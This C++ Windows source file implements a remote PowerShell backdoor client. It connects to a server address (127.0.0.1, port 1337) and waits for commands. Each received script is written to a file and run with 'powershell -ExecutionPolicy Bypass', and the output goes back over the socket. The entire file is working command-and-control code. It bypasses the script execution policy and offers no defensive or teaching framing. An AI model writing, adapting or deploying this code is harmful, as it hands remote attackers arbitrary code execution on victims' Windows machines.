#include <iostream>
#include<ctime>
#include <string>
#include<string.h>
#include <WS2tcpip.h>
#include <cstdlib>
#include<Windows.h>
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <fstream>
#pragma comment(lib, "ws2_32.lib")


using namespace std;


std::string exec(const char* cmd) {
	std::array<char, 128> buffer;
	std::string result;
	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
	if (!pipe) {
		throw std::runtime_error("popen() failed!");
	}
	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
		result += buffer.data();
	}
	return result;
}


void main()
{
	string ipAddress = "127.0.0.1";			// IP Address of the server
	int port = 1337;						// Listening port # on the server

	// Initialize WinSock
	WSAData data;
	WORD ver = MAKEWORD(2, 2);
	int wsResult = WSAStartup(ver, &data);
	if (wsResult != 0)
	{
		cerr << "Can't start Winsock, Err #" << wsResult << endl;
		return;
	}

	// Create socket
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET)
	{
		cerr << "Can't create socket, Err #" << WSAGetLastError() << endl;
		WSACleanup();
		return;
	}

	// Fill in a hint structure
	sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(port);
	inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);

	// Connect to server
	int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
	if (connResult == SOCKET_ERROR)
	{
		cerr << "Can't connect to server, Err #" << WSAGetLastError() << endl;
		closesocket(sock);
		WSACleanup();
		return;
	}

	// Do-while loop to send and receive data
	char buf[4096];
	char p[] = "power";
	char e_power[] = "exit_power";
	char e_of_server[] = "exit_of_server";
	string userInput;
	string result = "";

	ZeroMemory(buf, 4096);
	int bytesReceived = recv(sock, buf, 4096, 0);

	while (strcmp(buf, e_of_server) != 0)
	{

		if (bytesReceived > 0)
		{
			if (strcmp(buf, p) == 0)
			{
				while (strcmp(buf, e_power) != 0)
				{
					ZeroMemory(buf, 4096);
					int bytesReceived = recv(sock, buf, 4096, 0);
					ofstream file;
					file.open("test.ps1");

					string newArg = "-auto";
					string powershell;
					powershell = buf;

					file << powershell << endl;
					file.close();

					result = exec("powershell -ExecutionPolicy Bypass -F test.ps1");
					cout << result;

					if (result.size() > 0) {
						remove("test.ps1");
						int sendResult = send(sock, result.c_str(), result.size(), 0);
						result = "";
					}
					else
					{
						result = "good....";
						int sendResult = send(sock, result.c_str(), result.size(), 0);
					}




				}

			}

			ZeroMemory(buf, 4096);
			int bytesReceived = recv(sock, buf, 4096, 0);

		}

	}






	// Gracefully close down everything
	closesocket(sock);
	WSACleanup();
}